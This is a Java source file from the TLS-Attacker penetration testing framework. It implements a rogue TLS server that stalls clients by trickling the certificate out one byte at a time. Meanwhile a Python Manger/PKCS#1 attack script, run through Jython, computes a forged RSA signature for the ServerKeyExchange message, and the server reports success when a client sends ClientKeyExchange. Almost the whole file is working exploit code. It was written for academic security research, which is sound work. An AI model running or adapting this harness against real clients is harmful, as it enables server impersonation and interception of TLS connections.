/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
 *
 * Copyright (C) 2015 Chair for Network and Data Security,
 *                    Ruhr University Bochum
 *                    (juraj.somorovsky@rub.de)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package de.rub.nds.tlsattacker.custom.tls.server;

import de.rub.nds.tlsattacker.attacks.pkcs1.Manger;
import de.rub.nds.tlsattacker.attacks.pkcs1.oracles.RealDirectMessagePkcs1Oracle;
import de.rub.nds.tlsattacker.tls.config.ClientCommandConfig;
import de.rub.nds.tlsattacker.tls.constants.ProtocolVersion;
import de.rub.nds.tlsattacker.tls.protocol.constants.ProtocolMessageType;
import de.rub.nds.tlsattacker.tls.protocol.handshake.constants.CipherSuite;
import de.rub.nds.tlsattacker.tls.protocol.handshake.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.record.constants.ByteLength;
import de.rub.nds.tlsattacker.util.ArrayConverter;
import de.rub.nds.tlsattacker.util.Time;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.math.BigInteger;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyStore;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.Security;
import java.security.cert.Certificate;
import java.security.cert.CertificateEncodingException;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.util.Arrays;
import java.util.Random;
import javax.crypto.Cipher;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.python.core.PyObject;
import org.python.core.PyString;
import org.python.util.PythonInterpreter;

/**
 * 
 * Timing: Chrome 30 sek, firefox 6min
 * 
 * @author juraj
 */
public class ServerWithPython {

    public static final int PORT = 8444;

    private static final Random RANDOM = new Random();

    private static boolean serverHelloSent;

    private static boolean serverCertSent;

    private static boolean serverHelloDoneSent;

    private static boolean ccsSent;

    private static boolean serverKeyExchangeSent;

    // cert message bytes for the 1024 bit key
    private static final String LOCAL_CERT_MESSAGE = "0b0002280002250002223082021e308201870204507c6eae300d06092a864886f70d01010505003056310b3009060355040613024445310c300a06035504080c034e5257310f300d06035504070c06426f6368756d310c300a060355040a0c03484749310c300a060355040b0c03525542310c300a06035504030c03525542301e170d3132313031353230313433385a170d3133313031353230313433385a3056310b3009060355040613024445310c300a06035504080c034e5257310f300d06035504070c06426f6368756d310c300a060355040a0c03484749310c300a060355040b0c03525542310c300a06035504030c0352554230819f300d06092a864886f70d010101050003818d003081890281810080c29bd12a9891a5824f4afa757c1bf072bcfbfdfa0f55e3522fbb510bd2699ada4d7882ddf950328e52b31557de862374d0ef7f7a2d5be57744f5dd99f25e50a785910cd588b764c600e6bc1379e815f5e25e903586c61011b3b4102ade60ce582218f6eb479fc671130622c21011f7f6d19f7bba2c9472578e14ca65884af30203010001300d06092a864886f70d0101050500038181003f9818b16ea3b2bb6dc959f127548c33bfb5edd559215530f1da4eaf461aae8201b95bcc70aa9fbc6ba5a24b2f38c135c4a4bf611ee340f3a2fb02b5f9df53dca8e0a39678b67104ac3fc0c2bc24343cc0f2832c2a4864b0c96df56c3151827a47f58538b409d911824300bb8c1c2f2299b7830318f90ec226d2e70ce28da954";

    private static byte[] clientRandom;

    private static byte[] serverRandom;

    private static final String MANGER_FILE = "Manger_on_v1.5.py";
    private static final String JKS_FILE = "../resources/server-1024.jks";
    private static final String PASSWORD = "password";
    private static final String ALIAS = "1024_rsa";

    private static RSAPrivateKey rsaPrivateKey;
    private static RSAPublicKey rsaPublicKey;
    private static Certificate cert;

    private static MangerExecutor mangerExecutor;

    private static byte[] preparedKeyExchangeToSign;

    private static String mangerFile;

    private static String jksFile;

    public static void main(String[] args) throws Exception {
	int portNumber;

	if (args.length == 0) {
	    portNumber = PORT;
	    mangerFile = MANGER_FILE;
	    jksFile = JKS_FILE;
	} else {
	    portNumber = Integer.parseInt(args[0]);
	    mangerFile = args[1];
	    jksFile = args[2];
	}

	Security.addProvider(new BouncyCastleProvider());
	KeyStore ks = KeyStore.getInstance("JKS");
	ks.load(new FileInputStream(jksFile), PASSWORD.toCharArray());

	cert = ks.getCertificate(ALIAS);

	rsaPrivateKey = (RSAPrivateKey) ks.getKey(ALIAS, PASSWORD.toCharArray());
	rsaPublicKey = (RSAPublicKey) cert.getPublicKey();

	ServerSocket serverSocket = new ServerSocket(portNumber);

	while (true) {
	    Socket clientSocket = serverSocket.accept();
	    OutputStream out = clientSocket.getOutputStream();
	    InputStream in;
	    in = (clientSocket.getInputStream());

	    byte[] input = new byte[1000];
	    int len;
	    while ((len = in.read(input, 0, input.length)) != -1) {
		System.out.println("Received: " + ArrayConverter.bytesToHexString(input, len));
		if (input[5] == 0x10) {
		    System.out.println("----------------------------------------------");
		    System.out.println("Attack successful, ClientKeyExchange received!");
		    System.out.println("----------------------------------------------");
		    return;
		}
		if (!serverHelloSent) {
		    clientRandom = Arrays.copyOfRange(input, 11, 43);
		    System.out.println("Client Random: " + ArrayConverter.bytesToHexString(clientRandom));
		}
		while (sendMessage(out))
		    ;
	    }
	}
    }

    /**
     * 
     * @param out
     * @return True if the server has to send next handshake message, False
     *         otherwise
     * @throws Exception
     */
    public static boolean sendMessage(OutputStream out) throws Exception {
	byte[] record;
	if (!serverHelloSent) {
	    byte[] serverHello = createServerHello();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverHello);
	    System.out.println("Server Hello Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    out.write(record);
	    serverHelloSent = true;
	    return true;
	} else if (!serverCertSent) {
	    long time = System.currentTimeMillis();
	    byte[] serverCert = createServerCertificate();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverCert);
	    System.out.println("Server Certificate Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    Thread.sleep(1000);
	    for (int i = 0; i < record.length; i++) {
		out.write(record, i, 1);
		if (i % 100 == 0) {
		    System.out.println("Sending certificate. Bytes sent: " + i);
		}
		Thread.sleep(110);
	    }
	    // out.write(record);
	    long diff = System.currentTimeMillis() - time;
	    System.out.println("Time for sending a cert [sec]: " + (diff / 1000));
	    serverCertSent = true;
	    return true;
	} else if (!serverKeyExchangeSent) {
	    byte[] serverKeyExchange = createServerKeyExchange();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverKeyExchange);
	    out.write(record);
	    System.out.println("Server Key Exchange Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    serverKeyExchangeSent = true;
	    return true;
	} else if (!serverHelloDoneSent) {
	    byte[] serverHelloDone = createServerHelloDone();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, serverHelloDone);
	    out.write(record);
	    System.out.println("Server Hello Done Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    serverHelloDoneSent = true;
	    return false;
	} else if (!ccsSent) {
	    byte[] ccs = { 0x01 };
	    record = createRecord(ProtocolMessageType.CHANGE_CIPHER_SPEC, ccs);
	    System.out.println("Server CCS Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	    out.write(record);
	    out.flush();
	    // ccsSent = true;
	    // return true;
	    // } else {

	    byte[] finished = createFinished();
	    record = createRecord(ProtocolMessageType.HANDSHAKE, finished);
	    out.write(record);
	    out.flush();
	    System.out.println("Server Finished Record (length: " + record.length + "): "
		    + ArrayConverter.bytesToHexString(record));
	}
	return false;
    }

    public static byte[] createFinished() {
	byte[] type = HandshakeMessageType.FINISHED.getArrayValue();
	byte[] length = new byte[3];
	byte[] data = new byte[44];
	length[2] = (byte) data.length;
	return ArrayConverter.concatenate(type, length, data);
    }

    public static byte[] createServerHelloDone() {
	byte[] shd = { 0x0e, 0x00, 0x00, 0x00 };
	return shd;
    }

    public static byte[] createServerHello() throws NoSuchAlgorithmException {
	byte[] type = HandshakeMessageType.SERVER_HELLO.getArrayValue();
	byte[] version = ProtocolVersion.TLS12.getValue();
	byte[] time = ArrayConverter.longToUint32Bytes(Time.getUnixTime());
	byte[] random = new byte[28];
	RANDOM.nextBytes(random);
	byte[] sessionIdLength = { 0x00 };
	byte[] cipher = CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA.getValue();
	byte[] compression = { 0x00 };
	byte[] extension = { 0x00, 0x23, 0x00, 0x00 };
	byte[] extensionLength = ArrayConverter.intToBytes(0x04, 2);

	byte[] result = ArrayConverter.concatenate(version, time, random, sessionIdLength, cipher, compression,
		extensionLength, extension);
	byte[] length = ArrayConverter.intToBytes(result.length, 3);
	result = ArrayConverter.concatenate(type, length, result);

	serverRandom = ArrayConverter.concatenate(time, random);

	prepareKeyExchangeToSign();

	mangerExecutor = new MangerExecutor(rsaPublicKey.getModulus().toString(), rsaPublicKey.getPublicExponent()
		.toString(), rsaPrivateKey.getPrivateExponent().toString(),
		new BigInteger(preparedKeyExchangeToSign).toString());
	System.out.println("Forwarding the following parameters:");
	System.out.println("N: " + rsaPublicKey.getModulus().toString());
	System.out.println("e: " + rsaPublicKey.getPublicExponent().toString());
	System.out.println("c: " + new BigInteger(preparedKeyExchangeToSign).toString());

	mangerExecutor.start();

	return result;
    }

    public static void prepareKeyExchangeToSign() throws NoSuchAlgorithmException {
	// curve type: named curve
	byte[] curveType = { 0x03 };
	// curve secp256r1
	byte[] curve = { 0x00, 0x17 };
	// pub key length
	byte[] pubkeyLength = { 0x41 };
	// pub key
	BigInteger pubkey = new BigInteger(
		"04164ab5928c36d7301559440faa6356acdfc15329c72ffb66c0ec98e97f7c597560b75c3fbc38cef8e33a331bee0e9dc57641202cc697b2173187448956b405b7",
		16);

	byte[] digestInput = ArrayConverter.concatenate(curveType, curve, pubkeyLength, pubkey.toByteArray());

	MessageDigest digest = MessageDigest.getInstance("SHA-256");
	digest.update(clientRandom);
	digest.update(serverRandom);
	digest.update(digestInput);
	byte[] digestOutput = digest.digest();

	// signature padding including asn1 string
	byte[] sigPadding = { 0x00, (byte) 0x01, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF,
		(byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0x00, (byte) 0x30, (byte) 0x31,
		(byte) 0x30, (byte) 0x0D, (byte) 0x06, (byte) 0x09, (byte) 0x60, (byte) 0x86, (byte) 0x48, (byte) 0x01,
		(byte) 0x65, (byte) 0x03, (byte) 0x04, (byte) 0x02, (byte) 0x01, (byte) 0x05, (byte) 0x00, (byte) 0x04,
		(byte) 0x20 };

	preparedKeyExchangeToSign = ArrayConverter.concatenate(sigPadding, digestOutput);
    }

    public static byte[] createServerKeyExchange() throws Exception {
	byte[] type = HandshakeMessageType.SERVER_KEY_EXCHANGE.getArrayValue();
	// curve type: named curve
	byte[] curveType = { 0x03 };
	// curve secp256r1
	byte[] curve = { 0x00, 0x17 };
	// pub key length
	byte[] pubkeyLength = { 0x41 };
	// pub key
	BigInteger pubkey = new BigInteger(
		"04164ab5928c36d7301559440faa6356acdfc15329c72ffb66c0ec98e97f7c597560b75c3fbc38cef8e33a331bee0e9dc57641202cc697b2173187448956b405b7",
		16);
	// signature hash algorithm: sha256, rsa
	byte[] sigHash = { 0x04, 0x01 };
	// signature length
	byte[] sigLength = { 0x00, (byte) 0x80 };

	Cipher cipher = Cipher.getInstance("RSA/ECB/NoPadding");
	cipher.init(Cipher.DECRYPT_MODE, rsaPrivateKey);
	byte[] computedSignature = cipher.doFinal(preparedKeyExchangeToSign);
	System.out.println("Test Signature: " + ArrayConverter.bytesToHexString(computedSignature));

	mangerExecutor.join();
	byte[] signature = mangerExecutor.result.toByteArray();

	byte[] result = ArrayConverter.concatenate(curveType, curve, pubkeyLength, pubkey.toByteArray(), sigHash,
		sigLength, signature);
	// byte[] result = tmp.toByteArray();
	byte[] length = ArrayConverter.intToBytes(result.length, 3);
	result = ArrayConverter.concatenate(type, length, result);

	return result;
    }

    public static byte[] createServerCertificate() throws CertificateEncodingException {
	BigInteger bi = new BigInteger(LOCAL_CERT_MESSAGE, 16);
	return bi.toByteArray();
	// return cert.getEncoded();
    }

    public static byte[] createRecord(ProtocolMessageType contentType, byte[] data) {
	byte[] result = null;

	switch (contentType) {
	    case HANDSHAKE:
		// todo work with database, accept as parameter recordlayer
		// object
		result = ArrayConverter.concatenate(ProtocolMessageType.HANDSHAKE.getArrayValue(),
			ProtocolVersion.TLS12.getValue(),
			ArrayConverter.intToBytes(data.length, ByteLength.RECORD_LENGTH), data);
		break;
	    case CHANGE_CIPHER_SPEC:
		result = ArrayConverter.concatenate(ProtocolMessageType.CHANGE_CIPHER_SPEC.getArrayValue(),
			ProtocolVersion.TLS12.getValue(),
			ArrayConverter.intToBytes(data.length, ByteLength.RECORD_LENGTH), data);
		break;
	}

	return result;
    }

    static class MangerExecutor extends Thread {

	BigInteger result;

	PythonInterpreter python;

	/**
	 * constructor with hex parameters
	 * 
	 * @param N
	 * @param e
	 * @param d
	 * @param c
	 */
	MangerExecutor(String N, String e, String d, String c) {
	    python = new PythonInterpreter();
	    python.execfile(mangerFile);
	    python.set("N", new PyString(N));
	    python.set("e", new PyString(e));
	    python.set("d", new PyString(d));
	    python.set("c", new PyString(c));
	}

	@Override
	public void run() {
	    python.exec("result = perform_attack(N, e, d, c)");
	    PyObject res = python.get("result");
	    String r = res.toString();
	    if (r.endsWith("L")) {
		result = new BigInteger(r.substring(0, r.length() - 1));
	    } else {
		result = new BigInteger(r);
	    }
	    System.out.println("Attack result: " + ArrayConverter.bytesToHexString(result.toByteArray()));
	}
    }
}
